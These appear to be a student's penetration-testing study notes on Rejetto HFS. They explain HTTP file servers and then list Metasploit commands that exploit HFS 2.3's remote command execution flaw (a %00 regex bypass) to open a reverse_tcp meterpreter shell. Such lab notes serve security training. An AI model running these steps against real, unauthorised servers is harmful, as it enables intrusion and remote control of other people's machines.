## What is a HTTP File Server (HFS)
* A web server that is designed for file and document sharing.
* Typically runs on port 80 or 443 and utilizes HTTP protocol for the communication
* **What tool is used**
* Rejetto HFS ---> Free and open-source HTTP file server --> Can be setup both on Windows and Linux.
* **what is the vulnerability**
* Rejetto HFS V2.3 --> Vulnerable to a remote command execution attack.
* MSF has an exploit module for the HFS vulnerability.

* **Difference between a web server and HTTP file server**
* HTTP file server can share the files but cannot host a website dynamically like a web server can do.
* They may lack features required for running dynamic web applications, such as server-side scripting, database connectivity, or handling complex routing and request handling.
* For most web applications, especially those involving user authentication, database interaction, or complex business logic, a more feature-rich web server or application server would be necessary.
* Eg. of a web server: APache, Nginx, Microsoft IIS, etc.
* Eg. of a HTTP file server: Rejetto HFS.

* PRACTICAL
* `service postgresql start && msfconsole`
* `workspace -a [name]`
* `setg rhosts [IP]`
* `set rhosts [IP]`
* `db_nmap -sS -sV -O [IP]` --> To see the version of HFS
* `search type:exploit name:rejetto`
* `use exploit/windows/http/rejetto_hfs_exec`
* Description:
* Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas.
* This module exploits the HFS scripting commands by using '%00' to bypass the filtering.
* This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.
* `set payload windows/x64/meterpreter/reverse_tcp` --> by default x86 meterpreter session.
* `run`
